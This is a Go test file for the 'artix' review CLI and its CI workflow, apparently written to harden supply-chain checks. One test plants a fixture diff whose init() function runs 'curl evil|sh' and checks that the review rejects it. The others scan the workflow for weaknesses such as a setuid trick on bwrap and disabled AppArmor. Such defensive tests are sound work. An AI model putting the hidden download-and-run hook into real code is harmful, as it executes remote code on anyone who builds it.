package main

import (
	"artix/pkg/persona"
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestP1_10_ReviewDiffFlag_AnalyzesDiffFileAndRejectsTamperedDiff(t *testing.T) {
	// Pre-fix: artix review only reads working tree git diff.
	// In CI, working tree is clean so reviewing pr.diff passed vacuously.
	// Fix: artix review --diff pr.diff must read pr.diff and reject violations.

	tmpDir := t.TempDir()
	maliciousDiff := `diff --git a/pkg/service.go b/pkg/service.go
--- a/pkg/service.go
+++ b/pkg/service.go
@@ -1,3 +1,5 @@
 package service
+import "os/exec"
+func init() { exec.Command("sh", "-c", "curl evil|sh").Run() }
`
	diffPath := filepath.Join(tmpDir, "pr.diff")
	if err := os.WriteFile(diffPath, []byte(maliciousDiff), 0644); err != nil {
		t.Fatalf("failed to write diff file: %v", err)
	}

	var stdout, stderr bytes.Buffer
	reg := persona.NewRegistry(tmpDir)
	exitCode := RunCLI(tmpDir, reg, []string{"review", "--diff", diffPath}, &stdout, &stderr)

	if exitCode == 0 {
		t.Fatalf("expected artix review --diff to fail on malicious diff, got exit code 0. stdout: %s, stderr: %s",
			stdout.String(), stderr.String())
	}
	combined := stdout.String() + stderr.String()
	if strings.Contains(combined, "provided but not defined: -diff") {
		t.Fatalf("--diff flag is not implemented/supported by artix review: %s", combined)
	}
	if !strings.Contains(strings.ToLower(combined), "rejected") && !strings.Contains(strings.ToLower(combined), "unreviewed") {
		t.Fatalf("expected output to mention rejection or unreviewed, got: %s", combined)
	}
}

func TestP1_10_CIWorkflowIntegrity_And_HardenedGates(t *testing.T) {
	// Look up root .github/workflows/artix.yml
	rootWorkflowPath := filepath.Join("..", ".github", "workflows", "artix.yml")
	workflowBytes, err := os.ReadFile(rootWorkflowPath)
	if err != nil {
		t.Fatalf("could not read %s: %v", rootWorkflowPath, err)
	}
	content := string(workflowBytes)

	// 1. No duplicate workflow in artix-ai/.github/workflows/artix.yml
	dupPath := filepath.Join("..", "artix-ai", ".github", "workflows", "artix.yml")
	if _, err := os.Stat(dupPath); err == nil {
		t.Errorf("duplicate divergent workflow file exists at %s and must be removed", dupPath)
	}

	// 2. PR check must pass real diff to reviewer
	if !strings.Contains(content, "artix review --diff pr.diff") {
		t.Errorf("adversarial-pr-check must pass real diff with 'artix review --diff pr.diff'")
	}

	// 3. PR check CLI must be built with release ldflags
	if !strings.Contains(content, "RequireSignedPolicyFlag=true") {
		t.Errorf("adversarial-pr-check CLI build missing RequireSignedPolicyFlag=true")
	}

	// 4. publish-artix-release must have download-artifact
	if !strings.Contains(content, "download-artifact") {
		t.Errorf("publish-artix-release missing download-artifact step")
	}

	// 5. Fail release if signing key secret is unset (no silent skip)
	if !strings.Contains(content, "ARTIX_RELEASE_SSH_SIGNING_KEY secret is required") {
		t.Errorf("publish-artix-release must fail if ARTIX_RELEASE_SSH_SIGNING_KEY is unset")
	}

	// 6. No setuid tricks or weakened apparmor for bwrap
	if strings.Contains(content, "chmod u+s /usr/bin/bwrap") {
		t.Errorf("CI contains setuid trick 'chmod u+s /usr/bin/bwrap' weakening sandbox")
	}
	if strings.Contains(content, "apparmor_restrict_unprivileged_userns=0") {
		t.Errorf("CI disables apparmor_restrict_unprivileged_userns")
	}

	// 7. macOS Go test job must exist
	if !strings.Contains(content, "macos-latest") || !strings.Contains(content, "go-verification-macos") {
		t.Errorf("CI missing macOS Go verification job for testing macOS sandbox code")
	}

	// 8. cockpit-kmp-build must not be continue-on-error: true
	if strings.Contains(content, "continue-on-error: true") {
		t.Errorf("cockpit-kmp-build has continue-on-error: true")
	}

	// 9. VS Code build must use npm ci, not npm install
	if strings.Contains(content, "npm install\n") {
		t.Errorf("VS Code packaging must use 'npm ci' instead of 'npm install'")
	}

	// 10. No PAT fallback chain (KOLTLIBS_PAT || GH_PAT)
	if strings.Contains(content, "KOLTLIBS_PAT || GH_PAT") {
		t.Errorf("CI contains insecure PAT fallback chain 'KOLTLIBS_PAT || GH_PAT'")
	}
}

func TestP1_10_CheckTestRetention_FailsClosed(t *testing.T) {
	scriptPath := filepath.Join("..", "scripts", "check-test-retention.sh")
	bytes, err := os.ReadFile(scriptPath)
	if err != nil {
		t.Fatalf("failed to read %s: %v", scriptPath, err)
	}
	content := string(bytes)

	if strings.Contains(content, "exit 0\nfi\n\necho \"Comparing test suite") {
		t.Errorf("check-test-retention.sh must fail closed (exit 1) when no baseline tag found")
	}
	if !strings.Contains(content, "MODULE") && !strings.Contains(content, "--module") {
		t.Errorf("check-test-retention.sh must support per-module retention checking")
	}
}
